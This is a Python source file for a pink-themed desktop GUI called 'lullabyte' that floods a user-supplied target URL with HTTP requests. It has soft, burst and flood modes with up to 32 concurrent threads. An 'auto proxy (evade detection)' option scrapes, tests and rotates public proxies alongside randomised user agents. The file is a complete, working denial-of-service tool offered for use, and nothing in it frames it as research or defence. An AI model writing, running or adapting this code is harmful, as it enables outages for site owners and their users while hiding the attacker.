import sys
import os
import requests
import random
import threading
import time
from datetime import datetime
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from PIL import Image, ImageDraw, ImageFont
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QTextEdit, QCheckBox,
    QSizePolicy, QComboBox, QProgressBar, QHBoxLayout
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QPixmap, QImage, QFont, QColor

# --- light pink color palette ---
BG_MAIN = "#fff0f5"
BG_INPUT = "#ffffff"
BG_LOG = "#fff8fa"
TEXT_DARK = "#880e4f"
TEXT_MID = "#ad1457"
TEXT_LIGHT = "#c2185b"
TEXT_PLACEHOLDER = "#f48fb1"
ACCENT = "#f06292"
ACCENT_HOVER = "#ec407a"
BORDER = "#f8bbd0"
BORDER_FOCUS = "#f06292"
BUTTON_BG = "#f06292"
BUTTON_TEXT = "#ffffff"
BUTTON_HOVER = "#ec407a"
PROGRESS_CHUNK = "#f48fb1"
PROGRESS_BG = "#fce4ec"

# --- fonts ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FONT_PATH = os.path.join(BASE_DIR, "fonts", "Quicksand.ttf")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
]


def make_title_image():
    """render the title text using Pillow for crisp anti-aliased lettering."""
    try:
        font = ImageFont.truetype(FONT_PATH, 72)
    except (OSError, IOError):
        font = ImageFont.truetype("/usr/share/fonts/noto/NotoSans-Regular.ttf", 72)

    temp_img = Image.new("RGBA", (1, 1))
    draw = ImageDraw.Draw(temp_img)
    bbox = draw.textbbox((0, 0), "lullabyte", font=font)
    tw, th = bbox[2] - bbox[0], bbox[3] - bbox[1]

    pad_x, pad_y = 40, 20
    img = Image.new("RGBA", (tw + pad_x * 2, th + pad_y * 2), (0, 0, 0, 0))
    draw = ImageDraw.Draw(img)

    draw.text((pad_x, pad_y - bbox[1]), "lullabyte", font=font, fill=(240, 98, 146, 255))

    data = img.tobytes("raw", "RGBA")
    qimg = QImage(data, img.width, img.height, QImage.Format_RGBA8888)
    return QPixmap.fromImage(qimg)


def scrape_proxies():
    """fetch HTTP proxies from multiple public sources."""
    proxy_sources = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
        "https://raw.githubusercontent.com/ErcinDedeworken/proxies/main/http_proxies.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/Zaebedee/proxy-list/main/http.txt",
    ]

    proxies = []
    for url in proxy_sources:
        try:
            resp = requests.get(url, timeout=8)
            if resp.status_code == 200:
                lines = resp.text.strip().split("\n")
                for line in lines:
                    line = line.strip()
                    if line and ":" in line:
                        proxies.append(line)
        except requests.exceptions.RequestException:
            pass

    return list(set(proxies))


def filter_proxies(proxies, max_workers=64, timeout=3, check_url="https://example.com",
                   sample=300, target=100):
    """test a random sample of proxies against a benign endpoint, keeping working ones.

    Stops as soon as `target` working proxies are found (or the sample is exhausted),
    so it returns quickly instead of testing every proxy in a large list.
    """
    if not proxies:
        return []

    if len(proxies) > sample:
        proxies = random.sample(proxies, sample)

    retry = Retry(total=0)
    adapter = HTTPAdapter(pool_connections=max_workers, pool_maxsize=max_workers, max_retries=retry)
    session = requests.Session()
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    session.trust_env = False

    valid = []
    lock = threading.Lock()
    enough = threading.Event()

    def test(proxy):
        if enough.is_set():
            return
        proxies_map = {"http": proxy, "https": proxy}
        try:
            resp = session.get(check_url, proxies=proxies_map, timeout=timeout, verify=False)
            if resp.status_code == 200:
                with lock:
                    valid.append(proxy)
                    if len(valid) >= target:
                        enough.set()
        except requests.exceptions.RequestException:
            pass

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        list(executor.map(test, proxies))

    session.close()
    return valid


class AttackThread(QThread):
    log_signal = pyqtSignal(str)
    update_progress = pyqtSignal(int)

    def __init__(self, url, num_requests, attack_mode, use_proxy):
        super().__init__()
        self.url = url
        self.num_requests = num_requests
        self.attack_mode = attack_mode
        self.use_proxy = use_proxy
        self.proxies = []
        self.proxy_lock = threading.Lock()
        self.proxy_refresh_interval = 60
        self.running = True
        self.current_requests_sent = 0

    def _build_workers(self, num):
        """create a bounded thread pool and a shared pooled session."""
        retry = Retry(total=1, connect=1, read=1, redirect=1, backoff_factor=0.1, status_forcelist=[])
        adapter = HTTPAdapter(
            pool_connections=num,
            pool_maxsize=num,
            max_retries=retry,
            pool_block=True,
        )
        session = requests.Session()
        session.mount("https://", adapter)
        session.mount("http://", adapter)
        return ThreadPoolExecutor(max_workers=num), session

    def _send(self, session, headers, proxy):
        session.get(
            self.url,
            headers=headers,
            proxies=proxy,
            timeout=5,
            verify=False,
        )

    def run(self):
        self.log_signal.emit("~ lullabyte activated ~")

        if self.use_proxy:
            self.log_signal.emit("fetching proxies...")
            proxies = scrape_proxies()
            proxies = [p for p in proxies if p]
            self.log_signal.emit(f"scraped {len(proxies)} proxies, testing which actually work...")
            valid = filter_proxies(proxies)
            self.proxies = [{"http": p, "https": p} for p in valid]
            if self.proxies:
                self.log_signal.emit(f"{len(self.proxies)} working proxies :3")
            else:
                self.log_signal.emit("no working proxies found, going direct")
            refresher = threading.Thread(target=self._proxy_refresher, daemon=True)
            refresher.start()

        if self.attack_mode == "soft":
            workers = 1
        elif self.attack_mode == "burst":
            workers = 16
        else:
            workers = 32

        executor, session = self._build_workers(workers)

        try:
            if self.attack_mode == "soft":
                for _ in range(self.num_requests):
                    if not self.running:
                        break
                    try:
                        headers = {"User-Agent": random.choice(USER_AGENTS)}
                        proxy = self._pick_proxy()
                        self._send(session, headers, proxy)
                        self._count_request()
                    except requests.exceptions.RequestException as e:
                        self.log_signal.emit(f"[error] request failed: {e}")
            else:
                futures = []
                batch_target = 32 if self.attack_mode == "burst" else 64
                for _ in range(self.num_requests * (1 if self.attack_mode == "burst" else 5)):
                    if not self.running:
                        break
                    headers = {"User-Agent": random.choice(USER_AGENTS)}
                    proxy = self._pick_proxy()
                    futures.append(executor.submit(self._send, session, headers, proxy))
                    if len(futures) >= batch_target:
                        self._wait_batch(futures)
                        futures = []
                if futures:
                    self._wait_batch(futures)
        finally:
            executor.shutdown(wait=True, cancel_futures=False)
            session.close()

        if self.running:
            self.log_signal.emit("~ done! ~")
        self.update_progress.emit(0)

    def _pick_proxy(self):
        with self.proxy_lock:
            if self.use_proxy and self.proxies:
                return random.choice(self.proxies)
        return None

    def _wait_batch(self, futures):
        for fut in as_completed(futures):
            if not self.running:
                break
            try:
                fut.result()
            except requests.exceptions.RequestException as e:
                self.log_signal.emit(f"[error] request failed: {e}")
            except Exception as e:
                self.log_signal.emit(f"[error] {e}")
            self._count_request()

    def _count_request(self):
        self.current_requests_sent += 1
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_signal.emit(
            f"[{ts}] request {self.current_requests_sent}/{self.num_requests} ({self.attack_mode})"
        )
        progress = int((self.current_requests_sent / self.num_requests) * 100)
        self.update_progress.emit(min(progress, 100))

    def _load_proxies(self):
        """scrape + validate a fresh proxy list and swap it in."""
        try:
            proxies = scrape_proxies()
            proxies = [p for p in proxies if p]
            valid = filter_proxies(proxies)
            fresh = [{"http": p, "https": p} for p in valid]
            with self.proxy_lock:
                self.proxies = fresh
            self.log_signal.emit(f"proxies refreshed: {len(fresh)} working")
        except Exception as e:
            self.log_signal.emit(f"[error] proxy refresh failed: {e}")

    def _proxy_refresher(self):
        """periodically re-scrape and re-validate proxies while running."""
        while self.running:
            time.sleep(self.proxy_refresh_interval)
            self._load_proxies()

    def stop(self):
        self.running = False
        self.log_signal.emit("~ stopped by user ~")


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("lullabyte")
        self.setGeometry(200, 200, 680, 820)
        self.setMinimumSize(500, 600)

        self.setStyleSheet(f"""
            QMainWindow {{
                background-color: {BG_MAIN};
            }}
            QLabel {{
                color: {TEXT_DARK};
                font-family: 'Quicksand', 'Noto Sans', sans-serif;
                font-size: 13px;
                font-weight: 600;
            }}
            QLineEdit {{
                background-color: {BG_INPUT};
                color: {TEXT_DARK};
                border: 1.5px solid {BORDER};
                border-radius: 10px;
                padding: 10px 14px;
                font-family: 'Quicksand', 'Noto Sans', sans-serif;
                font-size: 14px;
                selection-background-color: {ACCENT};
            }}
            QLineEdit:focus {{
                border: 1.5px solid {BORDER_FOCUS};
            }}
            QComboBox {{
                background-color: {BG_INPUT};
                color: {TEXT_DARK};
                border: 1.5px solid {BORDER};
                border-radius: 10px;
                padding: 10px 14px;
                font-family: 'Quicksand', 'Noto Sans', sans-serif;
                font-size: 14px;
            }}
            QComboBox:focus {{
                border: 1.5px solid {BORDER_FOCUS};
            }}
            QComboBox::drop-down {{
                border: none;
                width: 30px;
            }}
            QComboBox::down-arrow {{
                image: none;
                border-left: 5px solid transparent;
                border-right: 5px solid transparent;
                border-top: 6px solid {TEXT_LIGHT};
                margin-right: 10px;
            }}
            QComboBox QAbstractItemView {{
                background-color: {BG_INPUT};
                color: {TEXT_DARK};
                border: 1.5px solid {BORDER};
                border-radius: 8px;
                selection-background-color: {PROGRESS_CHUNK};
                selection-color: {TEXT_DARK};
                padding: 4px;
            }}
            QTextEdit {{
                background-color: {BG_LOG};
                color: {TEXT_MID};
                border: 1.5px solid {BORDER};
                border-radius: 10px;
                padding: 10px;
                font-family: 'Quicksand', 'Noto Sans', monospace;
                font-size: 13px;
            }}
            QPushButton {{
                background-color: {BUTTON_BG};
                color: {BUTTON_TEXT};
                font-family: 'Quicksand', 'Noto Sans', sans-serif;
                font-size: 14px;
                font-weight: 700;
                border: none;
                border-radius: 10px;
                padding: 11px 28px;
            }}
            QPushButton:hover {{
                background-color: {BUTTON_HOVER};
            }}
            QPushButton:pressed {{
                background-color: {TEXT_DARK};
            }}
            QPushButton:disabled {{
                background-color: {BORDER};
                color: #ffffffaa;
            }}
            QCheckBox {{
                color: {TEXT_MID};
                font-family: 'Quicksand', 'Noto Sans', sans-serif;
                font-size: 13px;
                spacing: 8px;
            }}
            QCheckBox::indicator {{
                width: 18px;
                height: 18px;
                border-radius: 5px;
                border: 1.5px solid {BORDER};
                background-color: {BG_INPUT};
            }}
            QCheckBox::indicator:checked {{
                background-color: {ACCENT};
                border-color: {ACCENT};
            }}
            QCheckBox::indicator:hover {{
                border-color: {ACCENT};
            }}
            QProgressBar {{
                border: 1.5px solid {BORDER};
                border-radius: 8px;
                text-align: center;
                background-color: {PROGRESS_BG};
                color: {TEXT_DARK};
                font-family: 'Quicksand', 'Noto Sans', sans-serif;
                font-size: 12px;
                max-height: 18px;
            }}
            QProgressBar::chunk {{
                background-color: {PROGRESS_CHUNK};
                border-radius: 7px;
            }}
        """)

        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout()
        layout.setSpacing(8)
        layout.setContentsMargins(30, 20, 30, 20)

        # title (pillow rendered)
        self.title_label = QLabel()
        title_pixmap = make_title_image()
        self.title_label.setPixmap(title_pixmap)
        self.title_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.title_label)

        # subtitle
        sub = QLabel("by pluto")
        sub.setAlignment(Qt.AlignCenter)
        sub.setStyleSheet(f"color: {TEXT_LIGHT}; font-size: 13px; font-style: italic; margin-bottom: 10px;")
        layout.addWidget(sub)

        # url input
        url_label = QLabel("target url")
        url_label.setStyleSheet(f"color: {TEXT_DARK}; font-size: 12px; margin-top: 6px;")
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://example.com")
        layout.addWidget(url_label)
        layout.addWidget(self.url_input)

        # requests input
        req_label = QLabel("requests")
        req_label.setStyleSheet(f"color: {TEXT_DARK}; font-size: 12px; margin-top: 4px;")
        self.requests_input = QLineEdit()
        self.requests_input.setPlaceholderText("1000")
        layout.addWidget(req_label)
        layout.addWidget(self.requests_input)

        # mode selector
        mode_label = QLabel("mode")
        mode_label.setStyleSheet(f"color: {TEXT_DARK}; font-size: 12px; margin-top: 4px;")
        self.mode_selector = QComboBox()
        self.mode_selector.addItems(["soft", "burst", "flood"])
        layout.addWidget(mode_label)
        layout.addWidget(self.mode_selector)

        # proxy checkbox
        self.use_proxy = QCheckBox("auto proxy (evade detection)")
        self.use_proxy.setChecked(True)
        layout.addWidget(self.use_proxy)

        # buttons
        btn_layout = QHBoxLayout()
        btn_layout.setSpacing(12)
        self.start_button = QPushButton("launch")
        self.start_button.clicked.connect(self.start_attack)
        btn_layout.addWidget(self.start_button)

        self.stop_button = QPushButton("stop")
        self.stop_button.setEnabled(False)
        self.stop_button.clicked.connect(self.stop_attack)
        btn_layout.addWidget(self.stop_button)
        layout.addLayout(btn_layout)

        # progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setValue(0)
        layout.addWidget(self.progress_bar)

        # log output (at the bottom, compact)
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setMinimumHeight(120)
        self.log_output.setMaximumHeight(200)
        self.log_output.setPlaceholderText("logs will appear here...")
        layout.addWidget(self.log_output)

        central.setLayout(layout)
        self.attack_thread = None

    def log_message(self, message):
        self.log_output.append(message)
        self.log_output.ensureCursorVisible()

    def start_attack(self):
        url = self.url_input.text().strip()
        num_requests_str = self.requests_input.text().strip()

        if not (url.startswith("http://") or url.startswith("https://")):
            self.log_message("please enter a valid url (https://...)")
            return

        if not num_requests_str.isdigit() or int(num_requests_str) <= 0:
            self.log_message("please enter a valid number of requests")
            return

        num_requests = int(num_requests_str)
        attack_mode = self.mode_selector.currentText()
        use_proxy = self.use_proxy.isChecked()

        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.url_input.setEnabled(False)
        self.requests_input.setEnabled(False)
        self.mode_selector.setEnabled(False)
        self.use_proxy.setEnabled(False)

        self.progress_bar.setValue(0)
        self.log_output.clear()
        self.log_message("launching...")

        self.attack_thread = AttackThread(url, num_requests, attack_mode, use_proxy)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.update_progress.connect(self.progress_bar.setValue)
        self.attack_thread.start()

    def stop_attack(self):
        if self.attack_thread and self.attack_thread.isRunning():
            self.attack_thread.stop()
            self.attack_thread.wait()

        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.url_input.setEnabled(True)
        self.requests_input.setEnabled(True)
        self.mode_selector.setEnabled(True)
        self.use_proxy.setEnabled(True)
        self.progress_bar.setValue(0)


if __name__ == "__main__":
    app = QApplication(sys.argv)

    # set app-wide font
    font = QFont("Quicksand", 10)
    font.setStyleStrategy(QFont.PreferAntialias)
    app.setFont(font)

    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
